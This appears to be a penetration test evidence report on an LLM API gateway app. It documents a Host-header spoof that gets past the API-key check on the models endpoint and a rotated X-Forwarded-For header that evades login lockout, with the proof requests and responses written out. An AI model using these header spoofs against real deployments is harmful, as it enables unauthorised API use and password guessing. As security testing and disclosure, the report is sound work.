# Auth Evidence

### AUTH-VULN-01: Host Header Spoofing Bypasses API Key Requirement For Public LLM API

- Status: exploited
- Target: `GET /api/v1/models`
- Code pointer: `src/dashboardGuard.js:91` -> `src/dashboardGuard.js:182`; model endpoint `src/app/api/v1/models/route.js:433`
- Proof:

Control request to network-bound app without spoofed Host:

```http
GET /api/v1/models HTTP/1.1
Host: 192.168.51.4:20129

HTTP/1.1 401 Unauthorized
{"error":"API key required for remote API access"}
```

Same network-bound app with spoofed Host:

```http
GET /api/v1/models HTTP/1.1
Host: localhost:20129

HTTP/1.1 200 OK
{"object":"list","data":[{"id":"cc/claude-opus-4-8","object":"model","owned_by":"cc"}, ...]}
```

- Impact: network client can bypass API-key gate for public LLM API routes when service is reachable on a non-loopback interface and no browser `Origin` header is present. In a configured deployment, this can expose model inventory and allow unauthenticated LLM/API usage against stored provider accounts.
- Limits: proof stopped at model-list access to avoid consuming provider accounts. Isolated test data had no provider credentials.
- Cleanup: no persistent application data created. Temporary test cookie/data removed after report generation.

### AUTH-VULN-02: Login Lockout Bypass Via Spoofed X-Forwarded-For

- Status: confirmed-low-impact
- Target: `POST /api/auth/login`
- Code pointer: `src/app/api/auth/login/route.js:20` -> `src/lib/auth/loginLimiter.js:48`
- Proof:

Five failed attempts with same spoofed IP trigger lockout:

```http
POST /api/auth/login HTTP/1.1
X-Forwarded-For: 203.0.113.10
Content-Type: application/json

{"password":"wrong-pentest"}

HTTP/1.1 429 Too Many Requests
{"error":"Too many failed attempts. Try again in 30s. ...","retryAfter":30}
```

Changing only `X-Forwarded-For` avoids same lockout bucket:

```http
POST /api/auth/login HTTP/1.1
X-Forwarded-For: 203.0.113.11
Content-Type: application/json

{"password":"wrong-pentest"}

HTTP/1.1 401 Unauthorized
{"error":"Invalid password. 4 attempt(s) left before lockout.","remainingBeforeLock":4}
```

- Impact: attacker can rotate a client-controlled header to continue password guessing despite lockout. Risk is higher when default/weak initial passwords are used or dashboard is exposed through a proxy that forwards arbitrary `X-Forwarded-For`.
- Limits: proof used wrong test passwords only and did not attempt credential discovery.
- Cleanup: in-memory limiter state expires automatically; server stopped after report generation.

